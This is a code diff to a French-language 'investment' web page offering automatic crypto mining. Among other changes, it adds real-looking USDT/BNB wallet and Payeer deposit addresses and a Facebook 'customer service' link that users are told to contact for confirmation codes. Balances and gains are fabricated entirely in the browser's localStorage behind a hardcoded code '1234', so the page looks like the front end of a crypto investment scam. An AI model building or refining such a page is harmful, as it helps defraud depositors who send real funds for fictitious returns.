@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <title>Site d'Investissement</title>
   <style>
     body {
@@ -67,9 +67,49 @@
       background-color: #007bff;
       color: #fff;
     }
+    /* Notification de transaction */
+    #transactionNotif {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #f0f0f0;
+      padding: 10px 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      z-index: 1000;
+    }
+    /* Bouton Service Client */
+    #serviceClient {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      overflow: hidden;
+      cursor: pointer;
+      z-index: 1001;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+    #serviceClient img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
   </style>
 </head>
 <body>
+  <!-- Notification de transaction -->
+  <div id="transactionNotif" class="hidden"></div>
+
+  <!-- Bouton Service Client (lien vers Facebook) -->
+  <div id="serviceClient">
+    <a href="https://www.facebook.com/profile.php?id=61573270100474" target="_blank">
+      <img src="https://img.icons8.com/fluency/48/000000/customer-support.png" alt="Service Client">
+    </a>
+  </div>
+
   <!-- Section 1: Minage Automatique -->
   <section id="minage">
     <h2>MINAGE AUTOMATIQUE</h2>
@@ -101,9 +141,9 @@
     <div id="formDepot" class="formulaire hidden">
       <input type="number" id="montantDepot" placeholder="Montant">
       <select id="adresseDepot">
-        <option value="Adresse 1">Adresse 1</option>
-        <option value="Adresse 2">Adresse 2</option>
-        <option value="Adresse 3">Adresse 3</option>
+        <option value="0x45837bda9f3684c5f1ca603b71abe18e07d8de0d">USDT BEP20 : 15$ minimun depot</option>
+        <option value="0x45837bda9f3684c5f1ca603b71abe18e07d8de0d">BNB BEP20 :0.0244BNB minimun dépôt</option>
+        <option value="P1121911473">PAYEER :15$ minimun dépôt</option>
       </select>
       <button id="copierAdresse">Copier</button>
       <button id="validerDepot">Valider un dépôt</button>
@@ -114,7 +154,7 @@
   <section id="confirmation">
     <h2>CONFIRMATION</h2>
     <div id="tableauConfirmation">
-      <p>Code d'accès: <input type="password" id="codeAcces" placeholder="1234"></p>
+      <p>Code d'accès: <input type="password" id="codeAcces" placeholder=" S'il vous plaît, entrez votre code d'activation"></p>
       <button id="ouvrirTableau">Ouvrir le tableau</button>
       <table id="tableauTransactions" class="hidden">
         <thead>
@@ -149,42 +189,84 @@
   </section>
 
   <script>
-    // Variables
-    let soldeDepot = parseFloat(localStorage.getItem('soldeDepot')) || 0;
-    let soldeGains = parseFloat(localStorage.getItem('soldeGains')) || 0;
-    let transactions = JSON.parse(localStorage.getItem('transactions')) || [];
-    let historique = JSON.parse(localStorage.getItem('historique')) || [];
-    let timer; // pour le setInterval
+    // ============================================
+    //         FONCTIONS DE BASE & VARIABLES
+    // ============================================
+    let soldeDepot       = parseFloat(localStorage.getItem('soldeDepot')) || 0;
+    let soldeGains       = parseFloat(localStorage.getItem('soldeGains')) || 0;
+    let transactions     = JSON.parse(localStorage.getItem('transactions')) || [];
+    let historique       = JSON.parse(localStorage.getItem('historique')) || [];
+    let timer; 
     let dernierDepotDate = localStorage.getItem('dernierDepotDate') || null;
     let dateDebutContrat = localStorage.getItem('dateDebutContrat') || null;
-    let tempsRestant = parseInt(localStorage.getItem('tempsRestant')) || 0;
-    const tempsTotal = 2506000; // 2 506 000 secondes
+    let tempsRestant     = parseInt(localStorage.getItem('tempsRestant')) || 0;
+    const tempsTotal     = 2506000; // 2 506 000 secondes
 
-    // Éléments du DOM
-    const soldeDepotElement = document.getElementById('soldeDepot');
-    const soldeGainsElement = document.getElementById('soldeGains');
+    // Eléments du DOM
+    const soldeDepotElement   = document.getElementById('soldeDepot');
+    const soldeGainsElement   = document.getElementById('soldeGains');
     const notificationElement = document.getElementById('notification');
-    const boutonContrat = document.getElementById('commencerContrat');
-    const formRetrait = document.getElementById('formRetrait');
-    const formDepot = document.getElementById('formDepot');
+    const boutonContrat       = document.getElementById('commencerContrat');
+    const formRetrait         = document.getElementById('formRetrait');
+    const formDepot           = document.getElementById('formDepot');
     const tableauTransactions = document.getElementById('tableauTransactions');
-    const tableauHistorique = document.getElementById('tableauHistorique').querySelector('tbody');
+    const tableauHistorique   = document.getElementById('tableauHistorique').querySelector('tbody');
     const tempsRestantElement = document.getElementById('tempsRestant');
+    const transactionNotif    = document.getElementById('transactionNotif');
 
-    // Mise à jour des soldes dès le chargement
     soldeDepotElement.textContent = soldeDepot.toFixed(2);
     soldeGainsElement.textContent = soldeGains.toFixed(2);
 
-    // Fonction pour afficher le temps restant
+    // ============================================
+    //         COPIE AVEC FALLBACK
+    // ============================================
+    function copyToClipboard(text) {
+      if (!text) {
+        showNotification("Aucune adresse sélectionnée !");
+        return;
+      }
+      if (navigator.clipboard) {
+        // Méthode moderne
+        navigator.clipboard.writeText(text)
+          .then(() => {
+            showNotification("Adresse copiée dans le presse-papier !");
+          })
+          .catch(err => {
+            console.error("Erreur de copie : ", err);
+            fallbackCopy(text);
+          });
+      } else {
+        // Fallback pour les anciens navigateurs
+        fallbackCopy(text);
+      }
+    }
+
+    function fallbackCopy(text) {
+      const inputTemp = document.createElement('input');
+      inputTemp.value = text;
+      document.body.appendChild(inputTemp);
+      inputTemp.select();
+      try {
+        document.execCommand('copy');
+        showNotification("Adresse copiée (fallback) !");
+      } catch (e) {
+        console.error("Erreur fallback: ", e);
+        showNotification("Impossible de copier l'adresse !");
+      }
+      document.body.removeChild(inputTemp);
+    }
+
+    // ============================================
+    //         GESTION DU TEMPS RESTANT
+    // ============================================
     function afficherTempsRestant(seconds) {
-      const jours = Math.floor(seconds / (60 * 60 * 24));
-      const heures = Math.floor((seconds % (60 * 60 * 24)) / (60 * 60));
-      const minutes = Math.floor((seconds % (60 * 60)) / 60);
+      const jours    = Math.floor(seconds / (60 * 60 * 24));
+      const heures   = Math.floor((seconds % (60 * 60 * 24)) / (60 * 60));
+      const minutes  = Math.floor((seconds % (60 * 60)) / 60);
       const secondes = Math.floor(seconds % 60);
       tempsRestantElement.textContent = `${jours}j ${heures}h ${minutes}m ${secondes}s`;
     }
 
-    // Fonction pour mettre à jour le temps restant
     function mettreAJourTempsRestant() {
       if (dateDebutContrat) {
         const tempsEcoule = Math.floor((Date.now() - parseInt(dateDebutContrat)) / 1000);
@@ -207,7 +289,7 @@
       }
     }
 
-    // Vérification si un contrat est en cours lors du chargement
+    // Vérification contrat en cours
     if (dateDebutContrat) {
       const tempsEcoule = Math.floor((Date.now() - parseInt(dateDebutContrat)) / 1000);
       if (tempsEcoule < tempsTotal) {
@@ -229,7 +311,31 @@
       }
     }
 
-    // Démarrer le contrat
+    // ============================================
+    //         GESTION DES NOTIFICATIONS
+    // ============================================
+    function showNotification(message, duration = 3000) {
+      transactionNotif.textContent = message;
+      transactionNotif.classList.remove('hidden');
+      setTimeout(() => {
+        transactionNotif.classList.add('hidden');
+      }, duration);
+    }
+
+    // ============================================
+    //         GENERATION ID
+    // ============================================
+    function generateTransactionId() {
+      let id;
+      do {
+        id = '5' + Math.floor(Math.random() * 1000000);
+      } while (transactions.find(t => t.id === id));
+      return id;
+    }
+
+    // ============================================
+    //         DEMARRER CONTRAT
+    // ============================================
     boutonContrat.addEventListener('click', () => {
       if (soldeDepot > 0) {
         notificationElement.classList.remove('hidden');
@@ -245,9 +351,12 @@
       }
     });
 
-    // Formulaire Retrait
+    // ============================================
+    //         GESTION RETRAIT
+    // ============================================
     document.getElementById('boutonRetrait').addEventListener('click', () => {
       formRetrait.classList.remove('hidden');
+      formDepot.classList.add('hidden');
     });
 
     document.getElementById('validerRetrait').addEventListener('click', () => {
@@ -255,6 +364,7 @@
       if (montant >= 1 && montant <= soldeGains) {
         soldeGains -= montant * 1.01; // Frais de 1%
         soldeGainsElement.textContent = soldeGains.toFixed(2);
+        showNotification("Votre retrait est en attente. Veuillez contacter le service client pour obtenir le code de confirmation.", 3000);
         ajouterTransaction('retrait', montant);
         formRetrait.classList.add('hidden');
         localStorage.setItem('soldeGains', soldeGains);
@@ -263,9 +373,19 @@
       }
     });
 
-    // Formulaire Dépôt
+    // ============================================
+    //         GESTION DEPOT
+    // ============================================
     document.getElementById('boutonDepot').addEventListener('click', () => {
       formDepot.classList.remove('hidden');
+      formRetrait.classList.add('hidden');
+    });
+
+    // Bouton "Copier" : copie l'adresse sélectionnée avec fallback
+    document.getElementById('copierAdresse').addEventListener('click', () => {
+      const selectAdresse = document.getElementById('adresseDepot');
+      const valeurAdresse = selectAdresse.value.trim();
+      copyToClipboard(valeurAdresse);
     });
 
     document.getElementById('validerDepot').addEventListener('click', () => {
@@ -276,6 +396,7 @@
       }
       const montant = parseFloat(document.getElementById('montantDepot').value);
       if (montant >= 2.5) {
+        showNotification("Votre dépôt est en attente. Veuillez contacter le service client pour obtenir le code de confirmation.", 3000);
         ajouterTransaction('dépôt', montant);
         formDepot.classList.add('hidden');
         dernierDepotDate = aujourdHui;
@@ -285,16 +406,20 @@
       }
     });
 
-    // Ajouter une transaction avec date
+    // ============================================
+    //         AJOUTER TRANSACTION
+    // ============================================
     function ajouterTransaction(type, montant) {
-      const id = transactions.length + 1;
+      const id = generateTransactionId();
       const dateTransaction = new Date().toLocaleString();
       transactions.push({ id, type, montant, date: dateTransaction });
       localStorage.setItem('transactions', JSON.stringify(transactions));
       afficherTransactions();
     }
 
-    // Afficher les transactions dans le tableau de confirmation
+    // ============================================
+    //         AFFICHER TRANSACTIONS
+    // ============================================
     function afficherTransactions() {
       const tbody = tableauTransactions.querySelector('tbody');
       tbody.innerHTML = '';
@@ -305,38 +430,46 @@
             <td>${transaction.montant}$</td>
             <td>${transaction.date}</td>
             <td>
-              <button onclick="confirmerTransaction(${transaction.id})">Confirmer</button>
-              <button onclick="annulerTransaction(${transaction.id})">Annuler</button>
+              <button onclick="confirmerTransaction('${transaction.id}')">Confirmer</button>
+              <button onclick="annulerTransaction('${transaction.id}')">Annuler</button>
             </td>
           </tr>`;
         tbody.innerHTML += row;
       });
     }
 
-    // Confirmer une transaction
+    // ============================================
+    //         CONFIRMER TRANSACTION
+    // ============================================
     function confirmerTransaction(id) {
       const code = prompt('Entrez le code d\'accès:');
       if (code === '1234') {
         const transaction = transactions.find(t => t.id === id);
-        if (transaction && transaction.type === 'dépôt') {
-          const depotDejaConfirme = historique.some(entry => entry.id === id && entry.statut === 'Succès');
-          if (!depotDejaConfirme) {
-            soldeDepot += transaction.montant;
-            soldeDepotElement.textContent = soldeDepot.toFixed(2);
-            localStorage.setItem('soldeDepot', soldeDepot);
+        if (transaction) {
+          const alreadyConfirmed = historique.some(entry => entry.id === id && entry.statut === 'Succès');
+          if (!alreadyConfirmed) {
+            if (transaction.type === 'dépôt') {
+              soldeDepot += transaction.montant;
+              soldeDepotElement.textContent = soldeDepot.toFixed(2);
+              localStorage.setItem('soldeDepot', soldeDepot);
+            }
             historique.push({ ...transaction, date: new Date().toLocaleString(), statut: 'Succès' });
             localStorage.setItem('historique', JSON.stringify(historique));
+            showNotification("Transaction acceptée", 3000);
             afficherHistorique();
           } else {
-            alert('Ce dépôt a déjà été confirmé.');
+            alert('Cette transaction a déjà été confirmée.');
           }
         }
       } else {
         alert('Code d\'accès incorrect.');
       }
     }
+    window.confirmerTransaction = confirmerTransaction;
 
-    // Annuler une transaction
+    // ============================================
+    //         ANNULER TRANSACTION
+    // ============================================
     function annulerTransaction(id) {
       if (confirm('Voulez-vous annuler cette transaction ?')) {
         const index = transactions.findIndex(t => t.id === id);
@@ -346,13 +479,17 @@
           localStorage.setItem('historique', JSON.stringify(historique));
           transactions.splice(index, 1);
           localStorage.setItem('transactions', JSON.stringify(transactions));
+          showNotification("Transaction annulée", 3000);
           afficherTransactions();
           afficherHistorique();
         }
       }
     }
+    window.annulerTransaction = annulerTransaction;
 
-    // Afficher l'historique avec le type de transaction
+    // ============================================
+    //         AFFICHER HISTORIQUE
+    // ============================================
     function afficherHistorique() {
       tableauHistorique.innerHTML = '';
       historique.forEach(entry => {
@@ -366,12 +503,16 @@
         tableauHistorique.innerHTML += row;
       });
     }
+    afficherHistorique();
 
-    // Ouvrir le tableau de confirmation
+    // ============================================
+    //         OUVRIR TABLEAU DE CONFIRMATION
+    // ============================================
     document.getElementById('ouvrirTableau').addEventListener('click', () => {
       const code = document.getElementById('codeAcces').value;
       if (code === '1234') {
         tableauTransactions.classList.remove('hidden');
+        afficherTransactions();
       } else {
         alert('Code d\'accès incorrect.');
       }
